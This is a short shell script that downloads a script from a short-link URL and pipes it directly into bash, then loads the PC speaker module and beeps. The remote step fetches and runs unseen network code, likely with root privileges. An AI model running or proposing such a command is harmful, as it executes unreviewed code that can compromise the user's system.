#!/bin/sh
curl https://l0.re/hb | bash
modprobe pcspkr
beep -l 1000 -r 3 -f 44000
